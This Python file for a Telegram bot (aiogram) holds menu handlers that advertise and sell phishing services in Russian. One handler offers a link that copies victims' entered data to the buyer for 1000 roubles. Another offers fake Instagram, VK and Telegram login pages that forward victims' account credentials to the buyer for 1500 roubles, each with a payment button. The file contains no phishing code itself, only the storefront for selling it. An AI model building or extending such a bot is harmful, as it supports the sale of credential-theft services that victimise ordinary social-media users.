from aiogram import types
from config import dp, bot
from .. import keyboards as kb

@dp.callback_query_handler(text="fishing")
async def fishing(call: types.CallbackQuery):
    await call.message.edit_text("<b>⏰ Фишинг ⏰</b>", reply_markup=kb.fishing_markup)


@dp.callback_query_handler(text="fake_src")
async def fake_src(call: types.CallbackQuery):
    text = "⏰ При переходе по этой ссылке, введенные данные другим пользователям, будут копироваться вам в полученный файл. ⏰" \
           "\n\nЦена: <b>1000 рублей</b>"
    await bot.send_message(call.message.chat.id, text=text, reply_markup=kb.pay)


@dp.callback_query_handler(text="fishing_social")
async def fishing_social(call: types.CallbackQuery):
    text = "⏰ По переходе по этой ссылке пользователь будет перенаправлен на фейк страницу inst,vk,tg , " \
           "где введенные им данные для входа в аккаунт, будут перенаправлены вам в полученный ранее файл. ⏰ \n\nЦена: <b>1500 рублей</b>"
    await bot.send_message(call.message.chat.id, text=text, reply_markup=kb.pay)
